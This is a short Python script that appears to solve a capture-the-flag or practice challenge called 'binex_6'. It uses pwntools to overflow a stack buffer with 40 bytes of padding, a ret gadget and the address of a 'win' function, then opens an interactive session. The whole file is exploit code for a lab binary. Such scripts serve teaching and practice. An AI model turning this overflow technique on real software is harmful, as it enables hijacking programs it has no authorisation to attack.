from pwn import *

exe = './binex_6'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'info'

io = process(exe)

offset = b'A'*40

payload = flat([
    offset,
    rop.ret.address,
    elf.sym['win']
])

io.sendline(payload)
io.interactive()